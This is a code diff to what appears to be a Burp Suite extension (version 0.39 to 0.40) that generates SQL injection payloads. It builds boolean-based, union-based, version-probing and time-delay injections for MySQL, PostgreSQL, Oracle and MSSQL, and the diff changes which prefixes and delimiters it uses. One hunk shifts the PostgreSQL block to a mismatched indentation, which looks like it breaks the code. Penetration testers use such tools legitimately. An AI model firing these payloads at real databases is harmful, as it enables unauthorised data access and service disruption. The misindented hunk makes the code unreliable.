@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.39"
+VERSION = "0.40"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -671,18 +671,18 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         listSQLi = []
         #prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
         prefixes = ["", "\\n", "\\r\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
-        #prefixes = [""]
+        prefixes = [""]
 
-        #delimeterStarts = ["", "'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
-        delimeterStarts = ["'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
-        #delimeterStarts = ["'"]
+        #delimeterStarts = ["'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
+        delimeterStarts = ["", "'", "\\'", "\\\\'", "\"", "\\\"","\\\\\""]
+        delimeterStarts = ["", "'"]
         
         #delimeterBooleans = ["1=1", "1=2", "1<2", "1>2", "true", "false"]
         delimeterBooleans = ["1=1", "1<2", "true"]
-        #delimeterBooleans = ["true"]
+        delimeterBooleans = ["true"]
         
         delimeterEnds = ["", ";", " -- ", "; -- "]
-        #delimeterEnds = ["", "--"]
+        delimeterEnds = ["", "--"]
 
         if self._cbBooleanBased.isSelected():
             for prefix in prefixes:
@@ -694,8 +694,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                 listSQLi.append(prefix + delimeterStart + " or " + delimeterBoolean + delimeterStart + "\n")
                                 listSQLi.append(prefix + " or " + delimeterBoolean + delimeterEnd + "\n")
             for prefix in prefixes:
-                #for delimeterStart in delimeterStarts[1:]:
-                for delimeterStart in delimeterStarts:
+                for delimeterStart in delimeterStarts[1:]:
+                #for delimeterStart in delimeterStarts:
                     for delimeterEnd in delimeterEnds[1:]:
                         if prefix[:2].count("\\") == delimeterStart[:2].count("\\") or prefix.find('\\') or delimeterStart.find('\\'): 
                             listSQLi.append(prefix + delimeterStart + " or " + delimeterStart + "xyz" + delimeterStart + "=" + delimeterStart + "xyz" + "\n")
@@ -715,9 +715,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                 if self._cbMysqlBased.isSelected():
                                     if self._cbTimeBased.isSelected():
                                         listSQLi.append(prefix + delimeterStart + unionPhrase.replace("select null", "select sleep(1000)") + delimeterEnd + "\n")
-                                if self._cbPostgreBased.isSelected():
-                                    if self._cbTimeBased.isSelected():
-                                        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(1000))") + delimeterEnd + "\n")
+                               if self._cbPostgreBased.isSelected():
+                                   if self._cbTimeBased.isSelected():
+                                       listSQLi.append(prefix + delimeterStart + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(1000))") + delimeterEnd + "\n")
                                 #if self._cbMssqlBased.isSelected(): it seems mysql is not vulnerable with waitfor delay
                                 #    if self._cbTimeBased.isSelected():
                                 #        listSQLi.append(prefix + delimeterStart + unionPhrase.replace("select null", "select waitfor delay "+ delimeterStart + "00:20" + delimeterStart) + delimeterEnd + "\n")
@@ -741,9 +741,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                         if self._cbOracleBased.isSelected():
                             listSQLi.append(prefix + delimeterStart + ";select banner from v$version" + delimeterEnd + "\n")
                             listSQLi.append(prefix + delimeterStart + ";select version from v$instance" + delimeterEnd + "\n")
-                            #if not delimeterStart:
-                            #    listSQLi.append(prefix + delimeterStart + "select banner from v$version" + delimeterEnd + "\n")
-                            #    listSQLi.append(prefix + delimeterStart + "select version from v$instance" + delimeterEnd + "\n")
+                            if not delimeterStart:
+                                listSQLi.append(prefix + "select banner from v$version" + delimeterEnd + "\n")
+                                listSQLi.append(prefix + "select version from v$instance" + delimeterEnd + "\n")
+                                #listSQLi.append(prefix + delimeterStart + "select banner from v$version" + delimeterEnd + "\n")
+                                #listSQLi.append(prefix + delimeterStart + "select version from v$instance" + delimeterEnd + "\n")
                             if self._cbTimeBased.isSelected():
                                 if delimeterStart:
                                     listSQLi.append(prefix + delimeterStart + " and 1337=dbms_pipe.receive_message((" + delimeterStart + "a" + delimeterStart + "),1000)" + delimeterEnd + "\n")
@@ -761,8 +763,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                         
                         if self._cbMysqlBased.isSelected():
                             listSQLi.append(prefix + delimeterStart + ";select @@version" + delimeterEnd + "\n")
-                            #if not delimeterStart:
-                            #    listSQLi.append(prefix + delimeterStart + "select @@version" + delimeterEnd + "\n")
+                            if not delimeterStart:
+                                listSQLi.append(prefix + "select @@version" + delimeterEnd + "\n")
+                                #listSQLi.append(prefix + delimeterStart + "select @@version" + delimeterEnd + "\n")
                             if self._cbTimeBased.isSelected():
                                 listSQLi.append(prefix + delimeterStart + ";select sleep(1000)" + delimeterEnd + "\n")
                                 listSQLi.append(prefix + delimeterStart + " and sleep(1000)" + delimeterEnd + "\n")
@@ -777,14 +780,17 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                 listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from (select sleep(1000))A)" + delimeterStart + "\n")
                                 listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from (select sleep(1000))A)" + delimeterEnd + "\n")                                
                                 listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from (select sleep(1000))A) or " + delimeterStart + "\n")
-                                #if not delimeterStart:
-                                #    listSQLi.append(prefix + delimeterStart + "select sleep(1000)" + delimeterEnd + "\n")
-                                #    listSQLi.append(prefix + delimeterStart + "sleep(1000)" + delimeterEnd + "\n")
+                                if not delimeterStart:
+                                    listSQLi.append(prefix + "select sleep(1000)" + delimeterEnd + "\n")
+                                    listSQLi.append(prefix + "sleep(1000)" + delimeterEnd + "\n")
+                                    #listSQLi.append(prefix + delimeterStart + "select sleep(1000)" + delimeterEnd + "\n")
+                                    #listSQLi.append(prefix + delimeterStart + "sleep(1000)" + delimeterEnd + "\n")
                         
                         if self._cbPostgreBased.isSelected():
                             listSQLi.append(prefix + delimeterStart + ";select version()" + delimeterEnd + "\n")
-                            #if not delimeterStart:
-                            #    listSQLi.append(prefix + delimeterStart + "select version()" + delimeterEnd + "\n")
+                            if not delimeterStart:
+                                listSQLi.append(prefix + "select version()" + delimeterEnd + "\n")
+                                #listSQLi.append(prefix + delimeterStart + "select version()" + delimeterEnd + "\n")
                             if self._cbTimeBased.isSelected():
                                 listSQLi.append(prefix + delimeterStart + ";select pg_sleep(1000)" + delimeterEnd + "\n")
                                 listSQLi.append(prefix + delimeterStart + " and pg_sleep(1000)" + delimeterEnd + "\n")
@@ -799,14 +805,17 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                 listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from pg_sleep(1000))" + delimeterStart + "\n")
                                 listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from pg_sleep(1000))" + delimeterEnd + "\n")                                
                                 listSQLi.append(prefix + delimeterStart + " or 1337=(select 1337 from pg_sleep(1000)) or " + delimeterStart + "\n")
-                                #if not delimeterStart:
-                                #    listSQLi.append(prefix + delimeterStart + "select pg_sleep(1000)" + delimeterEnd + "\n")                                    
-                                #    listSQLi.append(prefix + delimeterStart + " pg_sleep(1000)" + delimeterEnd + "\n")
+                                if not delimeterStart:
+                                    listSQLi.append(prefix + "select pg_sleep(1000)" + delimeterEnd + "\n")                                    
+                                    listSQLi.append(prefix + "pg_sleep(1000)" + delimeterEnd + "\n")
+                                    #listSQLi.append(prefix + delimeterStart + "select pg_sleep(1000)" + delimeterEnd + "\n")                                    
+                                    #listSQLi.append(prefix + delimeterStart + " pg_sleep(1000)" + delimeterEnd + "\n")
                         
                         if self._cbMssqlBased.isSelected():
                             listSQLi.append(prefix + delimeterStart + ";select @@version" + delimeterEnd + "\n")
-                            #if not delimeterStart:
-                            #    listSQLi.append(prefix + delimeterStart + "select @@version" + delimeterEnd + "\n")
+                            if not delimeterStart:
+                                listSQLi.append(prefix + "select @@version" + delimeterEnd + "\n")
+                                #listSQLi.append(prefix + delimeterStart + "select @@version" + delimeterEnd + "\n")
                             if self._cbTimeBased.isSelected():
                                 if delimeterStart:
                                     listSQLi.append(prefix + delimeterStart + " and waitfor delay " + delimeterStart + "00:20" + delimeterStart + delimeterEnd + "\n")
